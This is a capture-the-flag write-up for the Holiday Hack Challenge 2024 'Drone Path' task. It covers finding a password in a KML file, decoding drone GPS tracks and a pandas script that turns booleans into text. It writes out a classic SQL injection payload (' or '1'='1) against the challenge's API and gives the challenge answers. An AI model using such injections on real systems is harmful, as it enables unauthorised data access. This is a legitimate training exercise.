+++
title = 'Drone Path'
date = 2024-11-23T13:18:31+01:00
draft = false
weight = 2
+++

## Objective

> Help the elf defecting from Team Wombley get invaluable, top secret intel to Team Alabaster. Find Chimney Scissorsticks, who is hiding inside the DMZ.

## Solution

### Silver

![Opening screen](/images/act2/act2-drone-path-1.png)

From the hamburger menu I accesses "FileShare" and got this landing page, where I could download a ```fritjolf-Path.kml``` file: 

![Fileshare](/images/act2/act2-drone-path-2.png)

Opening this .kml file in Google Earth, it opens up and shows a phrase: 

![Gumdrop 1](/images/act2/act2-drone-path-3.png)

```
GUMDROP1
```

By looking at these two things I have just discovered, there is something strange going on. Why is it a name in the filename? And could this GUMDROP1 string be a password. Trying my luck using it as login credentials: 

![Logged in](/images/act2/act2-drone-path-4.png)

Snooping around, I found a downloadable CSV file in the profile section:

![Profile section](/images/act2/act2-drone-path-5.png)

By the look of it, it appears to be some an export of KML. Trying to convert it into CSV by using ```https://www.convertcsv.com/csv-to-kml.htm```:

![Converting CSV to KML](/images/act2/act2-drone-path-6.png)

Opening the export up in Google Earth:

![Opening export](/images/act2/act2-drone-path-7.png)

By zooming in I saw structures resembling letters: 

![Landscape letters](/images/act2/act2-drone-path-8.png)

Making notes of each "letter" in Excel I found: 

![Landscape letters](/images/act2/act2-drone-path-9.png)

Found what is most likely a drone name: ```ELF-HAWK```. Went back to the web app and searched for the drone, got this:

![Landscape letters](/images/act2/act2-drone-path-10.png)

Yet another CSV. Converted it to KML by the same way as earlier. Opened it in ```https://kmzview.com/```, appears that the positions may indicate some text of some sorts: 

![Some sort of text](/images/act2/act2-drone-path-11.png)

Tried to find alternative ways of rendering the positions from this list: ```https://gislayer.medium.com/online-web-based-kml-kmz-viewers-1954c33a9a53```. Ended up with this: 

![Found text](/images/act2/act2-drone-path-12.png)


**Answer:** DroneDataAnalystExpertMedal

Heading back into the web app, I submitted this password from the "Admin Console" endpoint:

![Found text](/images/act2/act2-drone-path-13.png)

### Gold

Chimney Scissorsticks gives us a hint for Gold: 

> But I need you to dig deeper. Make sure you’re checking those file structures carefully, and remember—rumor has it there is some injection flaw that might just give you the upper hand. Keep your eyes sharp!

#### Solution

The hint hints at looking at the the various calls, and for each call I had a look at what could possibly be affected by an injection flaw. I came up with this candidate:

![Found text](/images/act2/act2-drone-path-gold-1.png)

Endpoint takes in drone name as GET parameter:

```
https://hhc24-dronepath.holidayhackchallenge.com/api/v1.0/drones?drone=test
```

By testing using this statement, I provoked an error: ```https://hhc24-dronepath.holidayhackchallenge.com/api/v1.0/drones?drone=ELF-HAWK'```

The error message looks like this:

![500 error](/images/act2/act2-drone-path-gold-2.png)

By this I had found an SQL Injection fault - which I then exploited by:

* Raw: ```https://hhc24-dronepath.holidayhackchallenge.com/api/v1.0/drones?drone=ELF-HAWK' or '1'='1```
* Urlencoded: ```https://hhc24-dronepath.holidayhackchallenge.com/api/v1.0/drones?drone=ELF-HAWK%27%20or%20%271%27=%271```

This enabled me to retrieve this list: 

```json
[
    {
        "name": "ELF-HAWK",
        "quantity": "40",
        "weapons": "Snowball-launcher"
    },
    {
        "name": "Pigeon-Lookalike-v4",
        "quantity": "20",
        "weapons": "Surveillance Camera"
    },
    {
        "name": "FlyingZoomer",
        "quantity": "4",
        "weapons": "Snowball-Dropper"
    },
    {
        "name": "Zapper",
        "quantity": "5",
        "weapons": "CarrotSpike"
    }
]
```

For each of these I passed their name through the endpoint: 

```
https://hhc24-dronepath.holidayhackchallenge.com/api/v1.0/drones?drone=
```

For drone "Pigeon-Lookalike-v4" I got the following hint: 

![Drone comment](/images/act2/act2-drone-path-gold-3.png)

There is something interesting by this hint: 

> I heard a rumor that there is something fishing with some of the files. There was some talk about only TRUE carvers would find secrets and that FALSE ones would never find it.

We've downloaded a bunch of CSV files during this task, so I'll simply look into the files again in reverse - starting with the latest. The words TRUE and FALSE are highlighted, so I suppose these means boolean.

This Python script does the following:

1. Open the "ELF-HAWK-dump.csv" in Pandas, ensuring everyting is loaded as strings
2. Removes all columns having not having text "TRUE" or "FALSE"
3. Removed all rows having just "FALSE" values
4. Replaces text "TRUE" with 1, and "FALSE" with 0
5. Writes the data to a text file

```python
import pandas as pd

df = pd.read_csv("ELF-HAWK-dump.csv", dtype=str)
df = df.loc[:, df.applymap(lambda x: x in ['TRUE', 'FALSE']).all()]
df = df[~df.apply(lambda row: (row == 'FALSE').all(), axis=1)]
df = df.replace({'TRUE': '1', 'FALSE': '0'})

with open("outdata", 'w') as f:
    for _, row in df.iterrows():
        row_values = ''.join(str(value) for value in row)
        f.write(row_values)
```

In order to solve this riddle I took the output and opened it in Cyberchef like so: 

![Cyberchef first try](/images/act2/act2-drone-path-gold-4.png)

I could not find anything interesting - then it dawned on me. Lets pad it in front with "00" (on a whim):

![Cyberchef second try](/images/act2/act2-drone-path-gold-5.png)

The code word is: 


**Answer:** EXPERTTURKEYCARVERMEDAL

Then submitting the code word:

![Cyberchef first try](/images/act2/act2-drone-path-gold-6.png)